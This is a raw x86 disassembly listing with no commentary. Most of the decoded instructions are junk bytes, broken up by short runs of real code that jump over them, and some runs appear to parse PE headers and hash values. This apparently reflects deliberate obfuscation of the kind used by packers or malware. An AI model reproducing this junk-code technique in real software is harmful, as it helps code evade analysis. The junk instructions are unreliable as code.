  41bdcf:	mov    edx,DWORD PTR [ebp+0x8]
  41bdd2:	sub    al,0x3d
  41bdd4:	cmp    BYTE PTR [ecx+edx*1],al
  41bdd7:	jmp    0x41bea5
  41bddc:	inc    esp
  41bddd:	shl    DWORD PTR [edi+0x4c],0xe7
  41bde1:	out    dx,al
  41bde2:	outs   dx,DWORD PTR ds:[esi]
  41bde3:	leave  
  41bde4:	js     0x41bdce
  41bde6:	std    
  41bde7:	jo     0x41bdf6
  41bde9:	das    
  41bdea:	add    eax,0x142e1cc
  41bdef:	add    BYTE PTR [ecx+0x1a000000],dh
  41bdf5:	pop    ebp
  41bdf6:	add    edx,DWORD PTR [ebx+eiz*2+0x18]
  41bdfa:	adc    ebx,edi
  41bdfc:	add    al,0xec
  41bdfe:	xchg   ebp,eax
  41bdff:	mov    ecx,0xdfd5388c
  41be04:	xor    DWORD PTR [edx+0x39],ebx
  41be07:	neg    DWORD PTR [ebp+0x47]
  41be0a:	or     BYTE PTR [ecx],dl
  41be0c:	push   0xffffffcd
  41be0e:	inc    ebp
  41be0f:	xchg   dl,al
  41be11:	int3   
  41be12:	lea    esp,[esi-0x453c8c1b]
  41be18:	sub    esi,DWORD PTR [eax]
  41be1a:	mov    ah,0x7c
  41be1c:	pop    edx
  41be1d:	and    BYTE PTR [ebx-0x2d245e51],0x27
  41be24:	jmp    0x8e2b:0x56858e7f
  41be2b:	inc    ebx
  41be2c:	arpl   bx,dx
  41be2e:	stc    
  41be2f:	or     esp,esi
  41be31:	lahf   
  41be32:	mov    ebp,0xdbbf4e0c
  41be37:	ins    BYTE PTR es:[edi],dx
  41be38:	sbb    eax,0x3285dcec
  41be3d:	mov    edx,0xe28c18f
  41be42:	xlat   BYTE PTR ds:[ebx]
  41be43:	aam    0xda
  41be45:	mov    edi,0x13352347
  41be4a:	mov    bl,0x7f
  41be4c:	push   ecx
  41be4d:	mov    eax,ds:0xe9da7a40
  41be52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be53:	dec    sp
  41be55:	xor    DWORD PTR [ebp+0x7f6ba929],eax
  41be5b:	lock (bad) 
  41be5d:	xchg   edx,eax
  41be5e:	jb     0x41beac
  41be60:	out    0x5a,al
  41be62:	sub    DWORD PTR [edx+0x48457c2a],ecx
  41be68:	pop    esi
  41be69:	cld    
  41be6a:	mov    dh,bl
  41be6c:	push   ss
  41be6d:	or     dl,BYTE PTR [esi]
  41be6f:	push   eax
  41be70:	mov    BYTE PTR [ecx+0x19],ah
  41be73:	jg     0x41bef1
  41be75:	iret   
  41be76:	in     eax,dx
  41be77:	imul   esp,DWORD PTR [edx],0x5e
  41be7a:	call   0xb0c1:0x17aa7515
  41be81:	sub    DWORD PTR [ebp-0x74],esi
  41be84:	dec    edi
  41be85:	std    
  41be86:	pop    esp
  41be87:	cwde   
  41be88:	add    DWORD PTR [ecx],edx
  41be8a:	jg     0x41be62
  41be8c:	out    0x2a,al
  41be8e:	cli    
  41be8f:	call   0x78413d7a
  41be94:	cmc    
  41be95:	mov    bl,0xd0
  41be97:	adc    dl,BYTE PTR ss:[eax]
  41be9a:	xor    BYTE PTR [ebp-0x63],al
  41be9d:	add    al,0x7c
  41be9f:	or     ah,BYTE PTR [edi]
  41bea1:	cmp    eax,0xf8a03f8
  41bea6:	test   DWORD PTR [eax+0x9],esp
  41bea9:	add    BYTE PTR [eax],al
  41beab:	jmp    0x41bf79
  41beb0:	out    dx,eax
  41beb1:	clc    
  41beb2:	outs   dx,DWORD PTR ds:[esi]
  41beb3:	inc    edi
  41beb4:	jg     0x41be8d
  41beb6:	out    dx,eax
  41beb7:	clc    
  41beb8:	rcl    DWORD PTR [eax-0x6a6a85d5],cl
  41bebe:	pop    ss
  41bebf:	mov    eax,ds:0x14392
  41bec4:	mov    cl,0x0
  41bec6:	add    BYTE PTR [eax],al
  41bec8:	adc    esi,DWORD PTR [edi+0x6d]
  41becb:	das    
  41becc:	xchg   DWORD PTR cs:[ecx+eiz*1-0x3e],ecx
  41bed1:	(bad)  
  41bed2:	stos   BYTE PTR es:[edi],al
  41bed3:	stos   DWORD PTR es:[edi],eax
  41bed4:	jge    0x41bea2
  41bed6:	add    al,0x92
  41bed8:	lods   eax,DWORD PTR ds:[esi]
  41bed9:	and    al,0x84
  41bedb:	push   edx
  41bedc:	cmp    al,0x5e
  41bede:	push   cs
  41bedf:	mov    ds:0xeff7f91a,eax
  41bee4:	jno    0x41bf30
  41bee6:	sbb    al,BYTE PTR [ebx]
  41bee8:	pslld  mm2,QWORD PTR [ebx]
  41beeb:	pusha  
  41beec:	jl     0x41be95
  41beee:	pop    esp
  41beef:	cmp    al,dl
  41bef1:	pop    esi
  41bef2:	jge    0x41bea2
  41bef4:	inc    ecx
  41bef5:	fidiv  WORD PTR [esi-0x15]
  41bef8:	add    DWORD PTR [eax],0x9f83f983
  41befe:	jle    0x41bf62
  41bf00:	or     al,0xc8
  41bf02:	les    edi,FWORD PTR [esi+0x105a8497]
  41bf08:	scas   eax,DWORD PTR es:[edi]
  41bf09:	mov    cl,0x1d
  41bf0b:	jae    0x41bf3b
  41bf0d:	in     al,dx
  41bf0e:	imul   BYTE PTR [ebp+0x58]
  41bf11:	pop    eax
  41bf12:	lods   eax,DWORD PTR ds:[esi]
  41bf13:	push   cs
  41bf14:	scas   al,BYTE PTR es:[edi]
  41bf15:	fisubr DWORD PTR [ebx+0x63fd8643]
  41bf1b:	xchg   BYTE PTR [ebx-0x585d08b8],bl
  41bf21:	int    0xf7
  41bf23:	mov    ds:0x48b0d565,eax
  41bf28:	adc    BYTE PTR [edi],cl
  41bf2a:	cdq    
  41bf2b:	(bad)  [esi]
  41bf2d:	cmp    DWORD PTR [edx+eax*2],edi
  41bf30:	sbb    BYTE PTR [ecx],0xce
  41bf33:	pop    ecx
  41bf34:	bound  edx,QWORD PTR [ecx]
  41bf36:	dec    ecx
  41bf37:	test   bl,ch
  41bf39:	out    0xfc,eax
  41bf3b:	inc    edx
  41bf3c:	jnp    0x41bedc
  41bf3e:	pop    eax
  41bf3f:	adc    esi,DWORD PTR [edx-0x15]
  41bf42:	stos   DWORD PTR es:[edi],eax
  41bf43:	outs   dx,DWORD PTR ds:[esi]
  41bf44:	mov    eax,0xe24de734
  41bf49:	add    al,0x6b
  41bf4b:	out    0xe8,al
  41bf4d:	push   ecx
  41bf4e:	ss pop esi
  41bf50:	pop    ecx
  41bf51:	jmp    0x41bee3
  41bf53:	mov    ds:0xf0a2c390,al
  41bf58:	mov    cl,0xe6
  41bf5a:	pop    ds
  41bf5b:	stos   BYTE PTR es:[edi],al
  41bf5c:	dec    esi
  41bf5d:	inc    edi
  41bf5e:	pop    edi
  41bf5f:	xchg   edi,eax
  41bf60:	jp     0x41bf2a
  41bf62:	shl    BYTE PTR [esi],cl
  41bf64:	pop    esp
  41bf65:	clc    
  41bf66:	sub    DWORD PTR [ebx+0x7b474bdb],edx
  41bf6c:	pusha  
  41bf6d:	mov    DWORD PTR es:[edx-0x2d],ebp
  41bf71:	int    0xd2
  41bf73:	mov    WORD PTR [edx+0x36],ss
  41bf76:	pop    ebp
  41bf77:	inc    eax
  41bf78:	pushf  
  41bf79:	mov    ecx,DWORD PTR [ebp-0x4]
  41bf7c:	mov    eax,DWORD PTR [ebp-0x8]
  41bf7f:	imul   ecx,ecx,0xd24d9d8
  41bf85:	and    ecx,eax
  41bf87:	mov    eax,DWORD PTR [ebp-0xc]
  41bf8a:	mov    edx,DWORD PTR [ebp-0x4]
  41bf8d:	mov    esi,DWORD PTR [ebp-0x8]
  41bf90:	imul   edx,edx,0xd24d9d8
  41bf96:	jmp    0x41c064
  41bf9b:	inc    eax
  41bf9c:	fist   WORD PTR [esi-0x34]
  41bf9f:	(bad)  
  41bfa1:	fcmovu st,st(7)
  41bfa3:	cld    
  41bfa4:	ret    0x3336
  41bfa7:	jnp    0x41bf66
  41bfa9:	mov    esi,ebx
  41bfab:	inc    ebx
  41bfac:	inc    esp
  41bfad:	add    DWORD PTR [eax],eax
  41bfaf:	mov    cl,0x0
  41bfb1:	add    BYTE PTR [eax],al
  41bfb3:	fiadd  DWORD PTR [esi]
  41bfb5:	xlat   BYTE PTR ds:[ebx]
  41bfb6:	jbe    0x41bfd4
  41bfb8:	push   edx
  41bfb9:	xchg   esp,eax
  41bfba:	xchg   esi,eax
  41bfbb:	inc    esi
  41bfbc:	lea    ebp,[edi+0x50939022]
  41bfc2:	ds pop es
  41bfc4:	jae    0x41bff4
  41bfc6:	sbb    eax,0x2cfa1f80
  41bfcb:	fisubr WORD PTR [esi+0x65]
  41bfce:	fnstenv [ebx+0x3]
  41bfd1:	xchg   edi,eax
  41bfd2:	adc    ebx,DWORD PTR [esi-0x50]
  41bfd5:	pop    edi
  41bfd6:	push   0x36ec1631
  41bfdb:	dec    eax
  41bfdc:	int    0x6d
  41bfde:	and    BYTE PTR [edx+0x736a1b8c],bh
  41bfe4:	call   0x28e85ede
  41bfe9:	mov    al,ds:0xdaddfac3
  41bfee:	and    al,0x86
  41bff0:	xchg   ch,al
  41bff2:	popa   
  41bff3:	inc    esp
  41bff4:	sbb    DWORD PTR [ebp+0x8],ecx
  41bff7:	rep outs dx,BYTE PTR ds:[esi]
  41bff9:	mul    BYTE PTR [esi-0x3586c13b]
  41bfff:	mov    bh,0x8c
  41c001:	jb     0x41c07d
  41c003:	lods   eax,DWORD PTR ds:[esi]
  41c004:	mov    ah,0xdc
  41c006:	test   al,0xd2
  41c008:	jnp    0x41c028
  41c00a:	sbb    BYTE PTR es:[eax+0x16],cl
  41c00e:	popa   
  41c00f:	jb     0x41c046
  41c011:	sbb    al,0xae
  41c013:	xchg   edx,eax
  41c014:	xchg   DWORD PTR [edx],esp
  41c016:	ret    0x815d
  41c019:	xchg   edx,eax
  41c01a:	sbb    al,0xeb
  41c01c:	lahf   
  41c01d:	cmp    al,0x78
  41c01f:	hlt    
  41c020:	(bad)  
  41c021:	jns    0x41bfdd
  41c023:	test   DWORD PTR [edx-0x47e7ea4],ebp
  41c029:	or     edi,edi
  41c02b:	sub    BYTE PTR [esi+edi*8],0x1f
  41c02f:	mov    ebx,0xd8c3b4b7
  41c034:	add    DWORD PTR [ebp+0x3267feb9],0xffffffb6
  41c03b:	push   esp
  41c03c:	xor    dl,BYTE PTR ds:0xe43f352
  41c042:	and    esi,DWORD PTR [edi-0x22c2a856]
  41c048:	sahf   
  41c049:	adc    cl,ch
  41c04b:	jecxz  0x41c0af
  41c04d:	jb     0x41bfeb
  41c04f:	je     0x41bfe1
  41c051:	push   edi
  41c052:	pop    edx
  41c053:	and    dl,bh
  41c055:	pop    es
  41c056:	cmp    DWORD PTR [esp+esi*4+0x68],ebp
  41c05a:	cmp    dl,BYTE PTR [eax]
  41c05c:	sub    eax,0x5bc38ee3
  41c061:	mov    edx,0xc80b7520
  41c066:	and    edx,esi
  41c068:	mov    esi,DWORD PTR [ebp-0xc]
  41c06b:	jmp    0x41c139
  41c070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c071:	ret    0xf9b6
  41c074:	idiv   ch
  41c076:	out    dx,eax
  41c077:	ffreep st(7)
  41c079:	into   
  41c07a:	push   ds
  41c07b:	ret    
  41c07c:	mov    eax,ds:0xf41cf73c
  41c081:	inc    esp
  41c082:	add    DWORD PTR [eax],eax
  41c084:	mov    cl,0x0
  41c086:	add    BYTE PTR [eax],al
  41c088:	jle    0x41c0b0
  41c08a:	test   eax,0x329dccc4
  41c08f:	test   eax,0xc2adf0f5
  41c094:	pop    ebx
  41c095:	xor    eax,0xc346e919
  41c09a:	out    dx,al
  41c09b:	leave  
  41c09c:	in     eax,dx
  41c09d:	mov    ecx,0x2869bf9
  41c0a2:	outs   dx,DWORD PTR ds:[esi]
  41c0a3:	ret    
  41c0a4:	cdq    
  41c0a5:	mov    ah,0x8e
  41c0a7:	rcl    BYTE PTR [esi-0x6f],1
  41c0aa:	jnp    0x41c05b
  41c0ac:	inc    esi
  41c0ad:	call   0xed236ac2
  41c0b2:	in     eax,0x44
  41c0b4:	sbb    esp,DWORD PTR [ebx+0x2c03888]
  41c0ba:	pop    ecx
  41c0bb:	sti    
  41c0bc:	jmp    0xfd1c:0x602c42ee
  41c0c3:	inc    esp
  41c0c4:	ret    0x83e
  41c0c7:	push   0xfffffff8
  41c0c9:	add    eax,0x7c7d9d13
  41c0ce:	loopne 0x41c08e
  41c0d0:	ins    BYTE PTR es:[edi],dx
  41c0d1:	add    BYTE PTR [edx-0x3b59b1df],0xd
  41c0d8:	imul   eax,DWORD PTR [eax-0x32],0xffffffe0
  41c0dc:	jns    0x41c0d0
  41c0de:	xchg   esp,eax
  41c0df:	ins    DWORD PTR es:[edi],dx
  41c0e0:	jp     0x41c07d
  41c0e2:	test   al,0x49
  41c0e4:	mov    dl,0xab
  41c0e6:	mov    BYTE PTR [eax+0x4d9a4510],bh
  41c0ec:	xchg   edx,eax
  41c0ed:	dec    ecx
  41c0ee:	mov    ds:0x48b1f035,eax
  41c0f3:	ins    BYTE PTR es:[edi],dx
  41c0f4:	sub    al,0x5b
  41c0f6:	and    al,0xa0
  41c0f8:	inc    esp
  41c0f9:	pusha  
  41c0fa:	xchg   DWORD PTR [ecx],ebx
  41c0fc:	push   esp
  41c0fd:	cwde   
  41c0fe:	mov    al,0x3d
  41c100:	clc    
  41c101:	push   edx
  41c102:	stos   BYTE PTR es:[edi],al
  41c103:	(bad)  
  41c104:	fistp  WORD PTR [ebp-0x1]
  41c107:	lea    edx,[ecx]
  41c109:	enter  0x848e,0x58
  41c10d:	popf   
  41c10e:	dec    ecx
  41c10f:	adc    DWORD PTR [ecx],esi
  41c111:	jne    0x41c144
  41c113:	xor    BYTE PTR [ebp-0x77],ah
  41c116:	je     0x41c14f
  41c118:	and    DWORD PTR [ebp-0x43],edi
  41c11b:	push   esp
  41c11c:	fcmovnu st,st(3)
  41c11e:	or     eax,0xc883b49f
  41c123:	or     DWORD PTR [edi-0x71a5bc8d],ebp
  41c129:	iret   
  41c12a:	xchg   edi,eax
  41c12b:	jno    0x41c0b8
  41c12d:	inc    edx
  41c12e:	adc    BYTE PTR [edx],ah
  41c130:	iret   
  41c131:	test   ecx,0x40854e15
  41c137:	aad    0x1b
  41c139:	mov    eax,0x3cfa
  41c13e:	xor    ecx,eax
  41c140:	jmp    0x41c20e
  41c145:	adc    DWORD PTR [ecx],edx
  41c147:	adc    ecx,edi
  41c149:	adc    ecx,edi
  41c14b:	fstp   st(7)
  41c14d:	xlat   BYTE PTR ds:[ebx]
  41c14e:	sub    DWORD PTR [esi+ecx*2+0x2e],0xa5c3f45b
  41c156:	inc    ebp
  41c157:	add    DWORD PTR [eax],eax
  41c159:	mov    cl,0x0
  41c15b:	add    BYTE PTR [eax],al
  41c15d:	in     eax,dx
  41c15e:	nop
  41c15f:	js     0x41c1b1
  41c161:	push   cs
  41c162:	shr    BYTE PTR [eax+0x6c],1
  41c165:	mov    edi,0xd40761f1
  41c16a:	mov    ch,0x47
  41c16c:	fwait
  41c16d:	into   
  41c16e:	aas    
  41c16f:	shl    DWORD PTR [edi],cl
  41c171:	inc    esp
  41c172:	(bad)  
  41c173:	repz xchg esp,eax
  41c175:	daa    
  41c176:	sbb    DWORD PTR [edi],0xbf69b8fd
  41c17c:	cdq    
  41c17d:	jne    0x41c17b
  41c17f:	out    0x68,al
  41c181:	adc    BYTE PTR [ebp+0x24],bh
  41c184:	loopne 0x41c194
  41c186:	fwait
  41c187:	sbb    eax,0xce471b70
  41c18c:	jno    0x41c165
  41c18e:	cmp    BYTE PTR [eax-0x4d066903],0x23
  41c195:	and    eax,0x6e658dd8
  41c19a:	cmp    BYTE PTR [ebx+ebx*1],0x0
  41c19e:	xor    ch,ah
  41c1a0:	mov    ecx,DWORD PTR [eax+0x50]
  41c1a3:	mov    ecx,0x87ea51da
  41c1a8:	popf   
  41c1a9:	fiadd  WORD PTR [eax+0x1]
  41c1ac:	dec    esi
  41c1ad:	jge    0x41c1bc
  41c1af:	adc    DWORD PTR [edi+0x70a282a6],ebp
  41c1b5:	xchg   edi,edi
  41c1b7:	loope  0x41c1d3
  41c1b9:	cmp    al,ah
  41c1bb:	sti    
  41c1bc:	mov    ah,0x47
  41c1be:	cmp    edi,DWORD PTR [edi]
  41c1c0:	leave  
  41c1c1:	cs fwait
  41c1c3:	stc    
  41c1c4:	jge    0x41c219
  41c1c6:	cld    
  41c1c7:	xor    DWORD PTR [ecx+0x49],eax
  41c1ca:	inc    ecx
  41c1cb:	cmp    al,0xce
  41c1cd:	aam    0xea
  41c1cf:	es cli 
  41c1d1:	xchg   edx,eax
  41c1d2:	out    0x34,eax
  41c1d4:	mov    ebx,0x133fade8
  41c1d9:	aaa    
  41c1da:	fucomp st(6)
  41c1dc:	xor    al,0xc4
  41c1de:	add    al,0xd4
  41c1e0:	daa    
  41c1e1:	xchg   ebp,eax
  41c1e2:	loopne 0x41c1b6
  41c1e4:	cli    
  41c1e5:	ins    DWORD PTR es:[edi],dx
  41c1e6:	pop    eax
  41c1e7:	pop    ebp
  41c1e8:	(bad)  
  41c1e9:	out    dx,eax
  41c1ea:	mov    edx,0xe190398b
  41c1ef:	mov    ebp,0xb5cd44ce
  41c1f4:	ins    DWORD PTR es:[edi],dx
  41c1f5:	pop    ss
  41c1f6:	mov    cl,0xd6
  41c1f8:	pop    edi
  41c1f9:	inc    edi
  41c1fa:	(bad)  
  41c1fb:	sbb    ah,dh
  41c1fd:	(bad)  
  41c1fe:	jecxz  0x41c26f
  41c200:	dec    esi
  41c201:	(bad)  
  41c203:	adc    eax,0x629e4c3f
  41c208:	imul   edi,DWORD PTR [esp+eax*2+0x28],0xe1c19cdb
  41c210:	push   es
  41c211:	or     edx,esi
  41c213:	xor    edx,eax
  41c215:	mov    eax,DWORD PTR [ebp+0x8]
  41c218:	mov    eax,DWORD PTR [ecx+eax*1+0x3c]
  41c21c:	jmp    0x41c2ea
  41c221:	sti    
  41c222:	dec    esp
  41c223:	out    dx,eax
  41c224:	inc    esp
  41c225:	jmp    edi
  41c227:	sti    
  41c228:	jmp    FWORD PTR [edx+0x36]
  41c22b:	and    bh,BYTE PTR [edi+ebp*8+0x56659e00]
  41c232:	inc    esi
  41c233:	add    DWORD PTR [eax],eax
  41c235:	mov    cl,0x0
  41c237:	add    BYTE PTR [eax],al
  41c239:	mov    eax,ds:0x5f3e07fd
  41c23e:	loop   0x41c1f2
  41c240:	cs aam 0x24
  41c243:	les    esp,FWORD PTR [esi+0x3b]
  41c246:	std    
  41c247:	sbb    ah,BYTE PTR [edx]
  41c249:	scas   eax,DWORD PTR es:[edi]
  41c24a:	xchg   ecx,eax
  41c24b:	cmp    ebp,edx
  41c24d:	cmp    DWORD PTR [edi+eiz*1+0x5fc4287],esi
  41c254:	ins    DWORD PTR es:[edi],dx
  41c255:	fdivr  st(1),st
  41c257:	add    ch,0x6
  41c25a:	mov    eax,0x891ccb2f
  41c25f:	jae    0x41c244
  41c261:	mov    bl,0xba
  41c263:	mov    cl,0x5f
  41c265:	cdq    
  41c266:	call   0x27df:0xceb5526d
  41c26d:	cmp    eax,0xd3d8269d
  41c272:	mov    bh,0x83
  41c274:	loop   0x41c27c
  41c276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c277:	add    BYTE PTR [esi-0x6e1a0885],0xfd
  41c27e:	aad    0x1d
  41c280:	test   al,0x84
  41c282:	jb     0x41c2f9
  41c284:	and    eax,0x51b4872a
  41c289:	sub    BYTE PTR [ebp+esi*1-0x37cd60e],ch
  41c290:	xchg   ebx,eax
  41c291:	jno    0x41c235
  41c293:	add    BYTE PTR [ebx-0x43],ch
  41c296:	rol    BYTE PTR [ebx+eax*8+0x289f8e11],0xa
  41c29e:	xor    dl,BYTE PTR [eax-0x2c]
  41c2a1:	push   ds
  41c2a2:	xor    ebx,DWORD PTR [esi-0xa]
  41c2a5:	call   0x9ae2:0x536b66b1
  41c2ac:	cmp    DWORD PTR [edi],0xed2a4815
  41c2b2:	fadd   DWORD PTR [edx-0xe]
  41c2b5:	push   ss
  41c2b6:	mov    edi,0x38628578
  41c2bb:	or     al,0x60
  41c2bd:	lahf   
  41c2be:	xor    DWORD PTR [ebx+0x2b],0xfdbd46e3
  41c2c5:	dec    edx
  41c2c6:	hlt    
  41c2c7:	cmp    ebx,ebp
  41c2c9:	mov    esp,eax
  41c2cb:	and    eax,0x6a17abfa
  41c2d0:	mov    ds:0x895947d2,eax
  41c2d5:	lock fcomip st,st(7)
  41c2d8:	dec    ecx
  41c2d9:	call   0x6c1e:0xa63ecb22
  41c2e0:	lds    eax,FWORD PTR [ebx]
  41c2e2:	mov    ds:0x8e70eacf,al
  41c2e7:	pop    es
  41c2e8:	sub    bh,dh
  41c2ea:	mov    ecx,DWORD PTR [ebp+0x8]
  41c2ed:	jmp    0x41c3bb
  41c2f2:	jp     0x41c2d7
  41c2f4:	pusha  
  41c2f5:	scas   eax,DWORD PTR es:[edi]
  41c2f6:	stc    
  41c2f7:	scas   eax,DWORD PTR es:[edi]
  41c2f8:	push   edi
  41c2fa:	lods   al,BYTE PTR ds:[esi]
  41c2fb:	sbb    esi,esp
  41c2fd:	imul   edi,DWORD PTR [esi+0x711e503],0xb1000147
  41c307:	add    BYTE PTR [eax],al
  41c309:	add    BYTE PTR [esi-0x45],bl
  41c30c:	outs   dx,BYTE PTR ds:[esi]
  41c30d:	xchg   dh,bh
  41c30f:	into   
  41c310:	mov    ds:0x58b5df01,eax
  41c315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c317:	and    al,0x58
  41c319:	and    DWORD PTR [edx-0x523c41e6],ebx
  41c31f:	pushf  
  41c320:	(bad)  
  41c322:	mov    bl,0xd2
  41c324:	dec    ebp
  41c325:	cmp    DWORD PTR [eax+0x6e5c2769],ebp
  41c32b:	ins    BYTE PTR es:[edi],dx
  41c32c:	int3   
  41c32d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c32e:	xor    BYTE PTR [ebx],al
  41c330:	gs xchg edi,eax
  41c332:	arpl   WORD PTR [ebp+0x46],bp
  41c335:	imul   edx,esp,0xa745c254
  41c33b:	fadd   DWORD PTR [edi-0x5f76f690]
  41c341:	adc    edi,DWORD PTR [edx+0x24]
  41c344:	out    0x3,ax
  41c347:	pop    ebp
  41c348:	retf   0x2b97
  41c34b:	ret    0xfbd5
  41c34e:	dec    edi
  41c34f:	std    
  41c350:	or     BYTE PTR [ebp-0x27],cl
  41c353:	cmp    DWORD PTR [ebp+0x5319c27f],ebp
  41c359:	out    dx,al
  41c35a:	js     0x41c2f7
  41c35c:	das    
  41c35d:	idiv   eax
  41c35f:	arpl   dx,cx
  41c361:	mov    edx,ds
  41c363:	sub    BYTE PTR [ebx+0x3e],cl
  41c366:	sub    al,0xc8
  41c368:	jnp    0x41c337
  41c36a:	out    dx,al
  41c36b:	jns    0x41c391
  41c36d:	call   FWORD PTR [eax]
  41c36f:	adc    DWORD PTR [ebx+0x54b3f4e6],0x33119e5c
  41c379:	or     eax,0x7b9ee45c
  41c37e:	mov    ch,0x67
  41c380:	aas    
  41c381:	retf   
  41c382:	xor    dl,dh
  41c384:	mov    al,ds:0xca8fb88e
  41c389:	mov    ds:0xdb9f6b23,eax
  41c38e:	mov    al,ds:0xeadd06f
  41c393:	xor    bh,BYTE PTR [ebx-0x51]
  41c396:	xchg   esp,eax
  41c397:	xchg   edx,eax
  41c398:	push   0xffffffb8
  41c39a:	in     al,0x16
  41c39c:	sbb    dh,BYTE PTR [edx+edi*4+0x134ada61]
  41c3a3:	lock xor bh,BYTE PTR [ebx-0x2751f83a]
  41c3aa:	into   
  41c3ab:	sub    DWORD PTR [ebx-0x52a2aeab],esp
  41c3b1:	(bad)  
  41c3b2:	jmp    0xff15:0x36e5acbe
  41c3b9:	addr16 int3 
  41c3bb:	add    eax,edx
  41c3bd:	jmp    0x41c48b
  41c3c2:	out    0xb6,al
  41c3c4:	cwde   
  41c3c5:	mov    esp,0xfee6bed8
  41c3ca:	or     ebp,DWORD PTR fs:[ecx-0x72]
  41c3ce:	and    eax,0xb8de1e43
  41c3d3:	inc    edi
  41c3d4:	add    DWORD PTR [eax],eax
  41c3d6:	mov    cl,0x0
  41c3d8:	add    BYTE PTR [eax],al
  41c3da:	xchg   ebx,eax
  41c3db:	fidivr DWORD PTR [edx+0x1a]
  41c3de:	adc    al,0x57
  41c3e0:	jmp    DWORD PTR [eax+eiz*4+0x7415a72c]
  41c3e7:	add    ch,BYTE PTR [eax-0x54]
  41c3ea:	enter  0xe831,0x37
  41c3ee:	mov    ah,0xf6
  41c3f0:	add    cl,al
  41c3f2:	aas    
  41c3f3:	js     0x41c468
  41c3f5:	cwde   
  41c3f6:	in     eax,dx
  41c3f7:	mov    dh,0x9a
  41c3f9:	ret    0xa0a4
  41c3fc:	or     bh,BYTE PTR [esi]
  41c3fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3ff:	sbb    al,0x65
  41c401:	mov    ebp,0x45698c40
  41c406:	ss add edi,esi
  41c409:	jne    0x41c471
  41c40b:	adc    al,0x20
  41c40d:	popa   
  41c40e:	add    BYTE PTR [edi],bh
  41c410:	xor    ecx,DWORD PTR [ebx-0x6eb4baa]
  41c416:	lahf   
  41c417:	and    al,0x55
  41c419:	scas   al,BYTE PTR es:[edi]
  41c41a:	sbb    al,0x59
  41c41c:	xor    eax,0x762ecdbf
  41c421:	sub    DWORD PTR [ebx],0x1bd1ce77
  41c427:	mov    cl,0x14
  41c429:	fld    QWORD PTR [esp+ebp*8-0x57]
  41c42d:	sbb    BYTE PTR [edx],bl
  41c42f:	mov    al,0xab
  41c431:	iret   
  41c432:	out    0xd5,eax
  41c434:	icebp  
  41c435:	jbe    0x41c426
  41c437:	or     al,0xfb
  41c439:	push   es
  41c43a:	jg     0x41c3e2
  41c43c:	xor    al,0xda
  41c43e:	and    dh,cl
  41c440:	adc    eax,0xe831df96
  41c445:	mov    WORD PTR [ebx],cs
  41c447:	inc    ebx
  41c448:	cli    
  41c449:	cmp    dh,BYTE PTR [eax+ebx*8+0x5df8e9ad]
  41c450:	push   cs
  41c451:	sbb    DWORD PTR ds:0xe1baf89b,eax
  41c457:	outs   dx,DWORD PTR ds:[esi]
  41c458:	pop    ss
  41c459:	pop    ss
  41c45a:	mov    al,ds:0xd6a9938e
  41c45f:	jb     0x41c48e
  41c461:	push   0x7ef7deba
  41c466:	sub    cl,BYTE PTR [esi+0xa]
  41c469:	mov    WORD PTR [eax],es
  41c46b:	cmp    eax,0x24c73039
  41c470:	mov    al,BYTE PTR [esi]
  41c472:	sbb    BYTE PTR [edx-0x22456a44],dl
  41c478:	jecxz  0x41c421
  41c47a:	fsubr  QWORD PTR [edx+0x5a]
  41c47d:	dec    ebx
  41c47e:	test   eax,0x142e80d9
  41c483:	jle    0x41c461
  41c485:	(bad)  
  41c486:	es cld 
  41c488:	sub    esp,ecx
  41c48a:	jo     0x41c48f
  41c48c:	enter  0x4d89,0x8
  41c490:	mov    eax,DWORD PTR [ebp-0x24]
  41c493:	mov    ecx,DWORD PTR [ebp+0x8]
  41c496:	add    eax,0x20db
  41c49b:	jmp    0x41c569
  41c4a0:	sub    esp,ebp
  41c4a2:	js     0x41c519
  41c4a4:	(bad)  
  41c4a5:	std    
  41c4a6:	das    
  41c4a7:	jmp    FWORD PTR [esi]
  41c4a9:	int3   
  41c4aa:	add    al,BYTE PTR [edx]
  41c4ac:	mov    eax,es
  41c4ae:	mov    bh,BYTE PTR [edx+0x69]
  41c4b1:	dec    eax
  41c4b2:	add    DWORD PTR [eax],eax
  41c4b4:	mov    cl,0x0
  41c4b6:	add    BYTE PTR [eax],al
  41c4b8:	rcr    BYTE PTR [edi-0x6f190916],cl
  41c4be:	dec    edx
  41c4bf:	les    edx,FWORD PTR [edx]
  41c4c1:	mov    ecx,0xd5233846
  41c4c6:	mov    al,0x41
  41c4c8:	inc    ecx
  41c4c9:	test   al,0xfa
  41c4cb:	jae    0x41c482
  41c4cd:	xchg   ebp,eax
  41c4ce:	mov    eax,ds:0x37dfb3f2
  41c4d3:	or     al,0x16
  41c4d5:	mov    bh,bh
  41c4d7:	push   eax
  41c4d8:	or     eax,ebp
  41c4da:	into   
  41c4db:	add    DWORD PTR [edi],edx
  41c4dd:	repnz mov BYTE PTR [edx-0x58],dl
  41c4e1:	xchg   ecx,eax
  41c4e2:	push   ebp
  41c4e3:	or     eax,DWORD PTR [edi+0x25]
  41c4e6:	fwait
  41c4e7:	aas    
  41c4e8:	(bad)  
  41c4ea:	test   DWORD PTR [esi+0x5f526bf6],ebp
  41c4f0:	rcl    BYTE PTR [edx],0xb1
  41c4f3:	popa   
  41c4f4:	xchg   ebx,eax
  41c4f5:	rcl    BYTE PTR es:[esi+0x7],cl
  41c4f9:	mov    ss,WORD PTR [eiz*4+0x56996135]
  41c500:	es pop ds
  41c502:	sbb    bh,BYTE PTR [eax+eiz*2+0x8ff487a]
  41c509:	xchg   BYTE PTR [ebp-0x4e],cl
  41c50c:	sbb    DWORD PTR [edi+0x0],edi
  41c50f:	arpl   WORD PTR [edi-0x97f8164],cx
  41c515:	out    0xe,eax
  41c517:	mov    edi,0xb76c7e97
  41c51c:	jmp    0x41c557
  41c51e:	lea    eax,[ecx+0x2d]
  41c521:	jno    0x41c580
  41c523:	push   ds
  41c524:	adc    al,BYTE PTR [ecx+0x9]
  41c527:	inc    ecx
  41c528:	mov    cl,0x84
  41c52a:	mov    dh,0x9d
  41c52c:	nop
  41c52d:	icebp  
  41c52e:	sahf   
  41c52f:	jmp    0x1a83752f
